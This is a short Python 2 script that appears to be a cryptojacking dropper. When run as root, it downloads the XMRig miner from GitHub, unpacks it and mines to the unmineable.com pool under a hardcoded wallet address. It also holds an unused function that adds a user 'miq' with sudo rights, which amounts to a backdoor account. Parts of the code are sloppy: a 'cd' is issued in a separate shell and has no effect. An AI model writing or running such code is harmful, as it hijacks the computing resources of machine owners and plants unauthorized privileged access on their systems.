#!/bin/python2
from os import system, getuid
from time import sleep
from random import randint

wall = "0xAA2f864dc7d9227B8e29a4fA36e4697D17d0538d"


def createUser():
		try:
			system(" sudo adduser  miq sudo ")
			system(" su miq ")
		except Exception as err:
				print("CreateUser_F_Error:", err)


def InitMiner():
		try:
				n = randint(0, 999)
				system("wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-bionic-x64.tar.gz && tar xf xmrig-6.7.0-bionic-x64.tar.gz && cd xmrig-6.7.0 ")
				system("echo AAAA")
				system(" ./xmrig-6.7.0/xmrig --cpu-priority 5 -o rx.unmineable.com:3333 -u SHIB:{}.MinerMiq_{} -p x -k -a rx/0 ".format(str(wall),  int(n)))

		except Exception as err:
				print(" Error: ", err)


try:
		if(getuid() == 0):
				print("Run as root...")
				InitMiner()
				print("Miner init suces...")

		else:
				print("Not is Root  User...")
except Exception as err:
		print(" Erro ao ser executado... ")
